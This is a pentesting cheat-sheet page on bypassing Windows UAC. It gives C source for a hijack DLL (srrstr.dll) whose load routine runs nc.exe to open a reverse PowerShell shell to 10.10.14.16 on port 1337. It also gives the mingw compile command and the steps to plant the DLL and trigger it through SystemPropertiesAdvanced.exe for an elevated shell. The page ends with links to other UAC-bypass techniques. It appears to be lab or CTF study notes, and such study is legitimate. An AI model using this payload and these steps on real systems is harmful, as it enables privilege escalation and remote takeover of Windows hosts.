# UAC Bypass
## Description

## Useful Commands


### SystemPropertiesAdvanced.exe


#### srrstr.dll

```c
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD dwReason, LPVOID lpReserved) {
	switch(dwReason) {
		case DLL_PROCESS_ATTACH:
			WinExec("C:\\Users\\<USERNAME>\\Documents\\nc.exe 10.10.14.16 1337 -e powershell", 0);
		case DLL_PROCESS_DETACH:
			break;
		case DLL_THREAD_ATTACH:
			break;
		case DLL_THREAD_DETACH:
			break;
	}

	return 0;
}
```

Compile on Kali:

```
root@kali:$ i686-w64-mingw32-g++ main.c -lws2_32 -o srrstr.dll -shared
```


#### DLL Hijacking

Upload `srrstr.dll` to `C:\Users\%USERNAME%\AppData\Local\Microsoft\WindowsApps\srrstr.dll` and check it:

```
PS > rundll32.exe srrstr.dll,xyz
```

Exec and get a shell ("requires an interactive window station"):

```
PS > cmd /c C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

* [egre55.github.io/system-properties-uac-bypass](https://egre55.github.io/system-properties-uac-bypass)
* [www.youtube.com/watch?v=krC5j1Ab44I&t=3570s](https://www.youtube.com/watch?v=krC5j1Ab44I&t=3570s)



### cmstp.exe

* [0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html](https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html)



### Bypass-UAC

* [github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC)

